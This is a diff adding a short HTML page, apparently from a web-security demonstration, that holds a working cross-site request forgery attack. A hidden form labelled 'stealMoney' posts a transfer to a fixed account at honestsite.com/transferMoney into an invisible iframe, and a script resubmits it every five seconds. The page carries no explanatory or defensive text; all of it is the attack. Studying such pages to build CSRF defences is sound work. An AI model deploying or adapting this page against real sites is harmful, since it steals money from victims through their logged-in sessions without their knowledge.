@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="ISO-8859-1">
+<title>Insert title here</title>
+<script src="https://code.jquery.com/jquery-3.1.1.js"
+			  integrity="sha256-16cdPddA6VdVInumRGo6IbivbERE8p7CQR3HzTBuELA="
+			  crossorigin="anonymous"></script>
+</head>
+<body>
+	<form id="stealMoney" method="post" action="http://honestsite.com/transferMoney" target="dummy">
+		<input type="hidden" name="toAccountNumber" value="987654322"/>
+		<input type="hidden" name="transferAmount" value="5"/>
+	</form>
+	<iframe name="dummy" id="dummy"></iframe>
+	<script type="text/javascript">
+		var stealMoney = function() {
+			document.getElementById("stealMoney").submit();
+		}
+		
+		setInterval(stealMoney, 5000);
+	</script>
+</body>
+</html>
